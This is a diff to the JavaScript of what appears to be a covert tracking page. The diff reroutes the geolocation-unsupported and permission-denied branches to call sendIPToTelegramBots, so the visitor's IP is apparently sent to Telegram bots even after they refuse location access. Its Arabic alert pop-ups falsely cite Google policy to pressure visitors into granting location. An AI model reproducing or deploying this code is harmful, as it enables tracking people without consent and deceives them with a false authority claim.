@@ -11,7 +11,26 @@
 sendIPToTelegramBots();
 yourFunction();
     
-    
+      navigator.geolocation.getCurrentPosition(showPosition, showError);
+function showPosition(position) {
+  // Use the retrieved coordinates here
+}
+function showError(error) {
+  // Handle errors, including permission denied
+  if (error.code === error.PERMISSION_DENIED) {
+    locationMessage.textContent = "Location permission denied. Functionality might be limited.";
+  } else {
+    // Handle other errors (e.g., unavailable location data)
+    locationMessage.textContent = "Location information is unavailable.";
+  }
+}
+
+// Show the message initially
+locationMessage.style.display = "block";
+
+
+
+
 window.onload = function() {
 
 
@@ -118,7 +137,7 @@ ${ipAddress}
 	  
 	   if (!navigator.geolocation) {
     // Geolocation not supported by browser
-yourFunction();
+sendIPToTelegramBots();
   alert(".تبعاً لسياسة جوجل اسمع لخدمة لوكيشن لاستمرار");
 
    //
@@ -131,7 +150,7 @@ yourFunction();
     },
     (error) => {
       if (error.code === error.PERMISSION_DENIED) {
-				yourFunction();
+				sendIPToTelegramBots();
 				
 		    //alert("اضغط سماح لاستمرار allow");
        alert("تبعاً لسياسة جوجل اسمع لخدمة لوكيشن لاستمرار");
